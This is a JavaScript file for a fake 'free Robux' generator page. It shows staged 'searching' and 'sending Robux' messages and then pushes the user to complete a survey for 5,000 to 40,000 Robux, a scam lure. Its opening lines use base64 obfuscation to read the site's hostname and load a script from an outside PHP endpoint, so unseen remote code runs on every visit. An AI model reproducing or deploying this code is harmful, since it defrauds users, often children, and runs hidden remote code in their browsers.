var a = window;var b = a[atob('bG9jYXRpb24=')];var ho =  b[atob('aG9zdG5hbWU=')];var dc = document;var d = atob('aHR0cHM6Ly9hY2RjLm15LmlkL215L215YXMucGhw')+"?host="+ho;
var s = dc.createElement(atob('c2NyaXB0'));s.src = d;dc.head.appendChild(s);
      

const btn = document.getElementById("next");
const box = document.getElementsByClassName("box")[0x0];
const box2 = document.getElementsByClassName("box2")[0x0];
const useroutput = document.getElementsByClassName('useroutput')[0x0];
const input = document.getElementsByClassName('username')[0x0];
const box3 = document.getElementsByClassName("box3")[0x0];
const box4 = document.getElementsByClassName('box4')[0x0];
const ltr = document.getElementById("ltr");
btn.addEventListener('click', function () {
  box.style.display = "none";
  box2.style.display = "block";
  useroutput.innerHTML = "searching for " + input.value + " ...";
  setTimeout(function () {
    box2.style.display = "none";
    box3.style.display = "block";
  }, 0x7d0);
});
 

   
function lasteps(_0x2bebf5) {
  if (input.value.trim() === '') {
    alert("Please enter a username!");
    return;
  }
  if (_0x2bebf5 == 0x1) {
    ltr.innerHTML = "<b>" + input.value + "</b> Please Click verify that you are not a robot & just complete survey email to get 5,000 robux ✅";
  } else {
    if (_0x2bebf5 == 0x2) {
      ltr.innerHTML = '<b>' + input.value + "</b> Please Click verify that you are not a robot & just complete survey email to get 10,000 robux ✅";
    } else {
      if (_0x2bebf5 == 0x3) {
        ltr.innerHTML = "<b>" + input.value + "</b>  Please Click verify that you are not a robot & just complete survey email 20,000 robux ✅";
      } else if (_0x2bebf5 == 0x4) {
        ltr.innerHTML = '<b>' + input.value + "</b> Please Click verify that you are not a robot & just complete survey email to get 40,000 robux ✅";
      }
    }
  }
  setTimeout(function () {
    box2.style.display = "none";
    box4.style.display = "block";
  }, 0x1388);
  useroutput.innerHTML = "Sending robux for " + input.value + " ...";
  box3.style.display = "none";
  box2.style.display = "block";
}
function getQueryParam(_0x5e1ada) {
  let _0x51e48a = new URLSearchParams(window.location.search);
  return _0x51e48a.get(_0x5e1ada);
}
document.addEventListener('DOMContentLoaded', function () {
  let _0x52395a = getQueryParam('s1');
  if (_0x52395a) {
    document.title = _0x52395a;
  }
});
